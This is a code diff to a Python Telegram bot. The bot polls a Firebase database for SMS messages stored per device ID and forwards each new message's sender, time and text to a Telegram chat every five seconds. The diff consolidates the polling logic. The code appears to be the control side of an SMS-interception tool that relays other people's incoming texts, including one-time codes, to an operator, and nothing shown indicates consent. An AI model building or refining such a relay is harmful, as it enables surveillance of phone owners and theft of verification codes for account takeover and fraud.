@@ -201,44 +201,43 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
-    last_sms_key = None
-    last_msg_key = None
+    last_sms_id = None
 
+    # Initial last_sms_id fetch kar rahe hain (specific device path se)
     try:
-        sms_data = requests.get(f"{firebase_base}/user_data/{selected_device_id}/sms.json").json()
-        if sms_data and isinstance(sms_data, dict):
-            last_sms_key = list(sms_data.keys())[-1]
-        msg_data = requests.get(f"{firebase_base}/user_data/{selected_device_id}/messages.json").json()
-        if msg_data and isinstance(msg_data, dict):
-            last_msg_key = list(msg_data.keys())[-1]
-    except Exception as e:
-        print(e)
+        data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
+        if data and isinstance(data, dict):
+            last_sms_id = list(data.keys())[-1]
+    except:
+        pass
 
     while is_monitoring:
         try:
-            sms_data = requests.get(f"{firebase_base}/user_data/{selected_device_id}/sms.json").json()
-            if sms_data and isinstance(sms_data, dict):
-                keys = list(sms_data.keys())
-                if keys[-1] != last_sms_key:
-                    last_sms_key = keys[-1]
-                    sms = sms_data[last_sms_key]
+            # Firebase se specific device ka data fetch karo
+            data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
+            
+            if data and isinstance(data, dict):
+                current_keys = list(data.keys())
+                latest_key = current_keys[-1]
+
+                # Sirf tabhi message bhejo agar nayi key mili hai
+                if latest_key != last_sms_id:
+                    last_sms_id = latest_key
+                    sms = data[latest_key]
+                    
                     if isinstance(sms, dict):
-                        text = f"📩 New Incoming SMS\n\n📱 From: {sms.get('sender', 'Unknown')}\n🕒 Time: {sms.get('dateTime', 'Unknown')}\n\n💬 Message: {sms.get('message', '')}"
-                    else: text = f"📩 New Incoming SMS\n\n{sms}"
+                        text = (f"📩 New Incoming SMS\n\n"
+                                f"📱 From: {sms.get('sender', 'Unknown')}\n"
+                                f"🕒 Time: {sms.get('dateTime', 'Unknown')}\n\n"
+                                f"💬 Message: {sms.get('message', '')}")
+                    else:
+                        text = f"📩 New Incoming SMS\n\n{sms}"
+                    
                     await context.bot.send_message(chat_id=chat_id, text=text)
 
-            msg_data = requests.get(f"{firebase_base}/user_data/{selected_device_id}/messages.json").json()
-            if msg_data and isinstance(msg_data, dict):
-                keys = list(msg_data.keys())
-                if keys[-1] != last_msg_key:
-                    last_msg_key = keys[-1]
-                    msg = msg_data[last_msg_key]
-                    if isinstance(msg, dict):
-                        text = f"📩 New Incoming SMS\n\n📱 From: {msg.get('sender', 'Unknown')}\n🕒 Time: {msg.get('dateTime', 'Unknown')}\n\n💬 Message: {msg.get('message', '')}"
-                    else: text = f"📩 New Incoming SMS\n\n{msg}"
-                    await context.bot.send_message(chat_id=chat_id, text=text)
         except Exception as e:
-            print(e)
+            print(f"Error in monitor: {e}")
+            
         await asyncio.sleep(5)
         
 async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
